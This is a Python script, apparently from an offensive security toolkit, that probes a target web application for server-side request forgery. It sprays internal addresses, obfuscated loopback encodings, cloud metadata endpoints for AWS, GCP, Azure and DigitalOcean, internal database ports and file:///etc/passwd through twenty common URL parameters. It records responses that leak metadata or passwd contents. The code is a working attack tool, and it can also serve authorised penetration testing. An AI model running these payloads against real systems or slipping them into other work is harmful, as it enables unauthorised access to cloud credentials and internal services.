"""
GLITCHICONS ⬡ — SSRF Tester v1.0
Tests: blind SSRF, open redirect, cloud metadata
"""
import requests
import sys
import time
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://[::1]",
    "http://0.0.0.0",
    "http://2130706433",  # 127.0.0.1 decimal
    "http://0177.0.0.1",  # 127.0.0.1 octal
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:6379",
    "http://localhost:27017",
    "dict://localhost:11211/",
    "file:///etc/passwd",
]

CLOUD_METADATA = {
    "AWS"   : "http://169.254.169.254/latest/meta-data/",
    "GCP"   : "http://metadata.google.internal/computeMetadata/v1/",
    "Azure" : "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean": "http://169.254.169.254/metadata/v1/",
}

SSRF_PARAMS = [
    "url", "redirect", "link", "src", "source",
    "target", "dest", "destination", "uri", "path",
    "file", "document", "page", "callback", "host",
    "webhook", "endpoint", "proxy", "fetch", "load",
]


def test_ssrf_params(url, cookies=None, delay=0.5):
    """Test common SSRF parameters."""
    console.print(f"\n[bold]→ SSRF Parameter Test[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    findings = []
    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS[:5]:
            try:
                r = session.get(
                    url,
                    params={param: payload},
                    timeout=8,
                    verify=False,
                    allow_redirects=False
                )
                # Indicators of SSRF
                if r.status_code == 200 and len(r.text) > 50:
                    lower = r.text.lower()
                    if any(sig in lower for sig in [
                        "ami-id", "instance-id",
                        "local-ipv4", "computeMetadata",
                        "root:", "/bin/bash",
                        "instance_type"
                    ]):
                        console.print(
                            f"  [red]⚠ SSRF CONFIRMED: "
                            f"param={param} payload={payload}[/red]"
                        )
                        findings.append({
                            "type"   : "SSRF_CONFIRMED",
                            "param"  : param,
                            "payload": payload,
                            "status" : r.status_code,
                            "sample" : r.text[:200],
                        })
                    elif r.status_code != 404:
                        console.print(
                            f"  [yellow]POSSIBLE: param={param} "
                            f"→ {r.status_code}[/yellow]"
                        )
                time.sleep(delay)
            except Exception:
                continue

    if not findings:
        console.print("  [green]No SSRF found[/green]")
    return findings


def run(url, cookies=None, output_dir=None):
    """Run SSRF test suite."""
    console.print(Panel(
        "[bold purple]⬡ GLITCHICONS SSRF TESTER[/bold purple]\n"
        f"[dim]Target: {url}[/dim]",
        border_style="purple"
    ))
    import warnings
    warnings.filterwarnings("ignore")

    findings = test_ssrf_params(url, cookies)

    if output_dir and findings:
        import json
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"ssrf_findings_{ts}.json"
        f.write_text(json.dumps(findings, indent=2))
        console.print(f"\nReport: {f}")

    console.print(
        f"\n[bold]Total: {len(findings)} SSRF findings[/bold]"
    )
    return findings


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else
        "https://target.example.com")
